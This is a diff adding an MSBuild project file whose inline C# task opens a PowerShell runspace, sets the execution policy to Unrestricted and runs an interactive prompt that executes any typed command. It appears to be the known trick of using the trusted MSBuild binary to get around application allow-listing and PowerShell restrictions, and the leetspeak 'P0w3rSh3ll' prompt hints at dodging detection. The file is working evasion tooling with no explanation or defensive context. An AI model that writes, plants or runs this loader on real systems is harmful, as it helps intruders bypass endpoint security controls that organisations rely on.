@@ -1,0 +1,97 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
+    <ItemGroup>
+      <Reference Include="System" />
+      <Reference Include="System.Core" />
+      <Reference Include="System.Xml.Linq" />
+      <Reference Include="System.Data.DataSetExtensions" />
+      <Reference Include="Microsoft.CSharp" />
+      <Reference Include="System.Data" />
+      <Reference Include="System.Net" />
+      <Reference Include="System.Xml" />
+      
+    </ItemGroup>
+ <Target Name="Hello">
+    <ClassExample/>
+ </Target>
+ 
+ <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+ <Task>
+    <Using Namespace="System"/>                                                                                                                                                                                                            
+    <Using Namespace="System.Reflection"/>                                                                                                                                                                                                 
+    <Using Namespace="System.Diagnostics"/> 
+    <Using Namespace="System.Net"/>       
+    <Using Namespace="System.Management.Automation"/>   
+    <Reference Include="System.Management.Automation" />    
+                                                                                                                                                                                            
+    <Code Type="Class" Language="cs">                                                                                                                                                                                                      
+    <![CDATA[                                                                                                                                                                                                                              
+        using System;                                                                                                                                                                                                                      
+        using System.IO;  
+        using System.Text;                                                                                                                                                                                                                 
+        using System.Reflection;                                                                                                                                                                                                           
+        using Microsoft.CSharp;                                                                                                                                                                                                            
+        using System.Runtime.InteropServices;                                                                                                                                                                                              
+        using Microsoft.Build.Framework;                                                                                                                                                                                                   
+        using Microsoft.Build.Utilities;       
+        using System.Security.Cryptography;     
+        using System.Net; 
+        using System.Management.Automation;
+        using System.Management.Automation.Runspaces;
+        using System.Collections.ObjectModel;
+                                                                                                                                                                                      
+        public class ClassExample : Task, ITask                                                                                                                                                                                            
+        {                                                                                                                                                                                                                                  
+            public override bool Execute()
+            {
+                Runspace runspace = RunspaceFactory.CreateRunspace();
+                runspace.Open();   
+                RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
+                runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");
+                Console.WriteLine("Type your P0w3rSh3ll command down here \n");
+                string command = "";
+
+                // loop for getting commands from Stdin
+                do
+                {
+                    Console.Write("PS > ");
+                    command = Console.ReadLine();
+                    
+
+                    // vervbse check!
+                    if (!string.IsNullOrEmpty(command))
+                    {
+                        using (Pipeline pipeline = runspace.CreatePipeline())
+                        {
+                            try
+                            {
+                                pipeline.Commands.AddScript(command);
+                                pipeline.Commands.Add("Out-String");
+                                
+                                // stay open and ready to accept and invoke commands
+                                Collection<PSObject> results = pipeline.Invoke();
+                                //var process = (Process)pipeline.Output.Read().BaseObject;
+
+                                StringBuilder stringBuilder = new StringBuilder();
+                                foreach (PSObject obj in results)
+                                {
+                                    stringBuilder.AppendLine(obj.ToString());
+                                }
+                                Console.Write(stringBuilder.ToString());
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine("{0}", ex.Message);
+                            }
+                        }
+                    }
+                }  while (command != "exit");
+                
+                runspace.Close();
+                return true;
+            }
+        }
+        ]]>
+        </Code>
+    </Task>
+    </UsingTask>
+</Project>
